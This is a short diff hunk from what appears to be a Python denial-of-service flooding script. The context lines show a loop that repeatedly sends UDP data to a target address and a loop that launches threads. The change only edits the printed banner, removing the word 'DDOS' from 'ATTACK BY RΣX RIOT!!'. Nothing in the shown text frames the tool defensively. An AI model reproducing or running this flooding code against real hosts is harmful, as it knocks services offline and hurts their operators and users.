@@ -49,9 +49,9 @@ def mmx():
   		sock.sendto(data,apa)
   		for x in range(times):
   			sock.sendto(data,apa)
-  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
   	except:
-  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
               
 for y in range(threads):
   rex = threading.Thread(target = ppx)
